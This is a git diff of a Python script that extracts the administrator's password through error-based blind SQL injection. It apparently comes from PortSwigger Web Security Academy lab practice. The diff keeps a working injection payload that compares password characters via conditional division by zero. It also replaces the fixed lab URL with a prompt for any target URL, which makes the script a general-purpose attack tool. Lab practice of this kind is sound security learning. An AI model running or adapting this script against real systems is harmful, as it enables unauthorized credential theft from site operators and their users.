@@ -6,7 +6,7 @@ import math
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}
+proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 def sql_injected_query(url, num, oper, pas):
     payload = "' and (select case when (1=1) then (1/0) else 1 end from users where username = 'administrator' and ascii(substr(password, %s, 1)) %s %s) = 1--" % (num, oper, pas)
@@ -39,7 +39,7 @@ def sql_inject(url):
             
 
 def main():
-    url = "https://0a9d007104e3a500c019076800020054.web-security-academy.net/"
+    url = input("Enter URL here:")
     print("(+) Retrieving Passwords...")
     sql_inject(url)
 
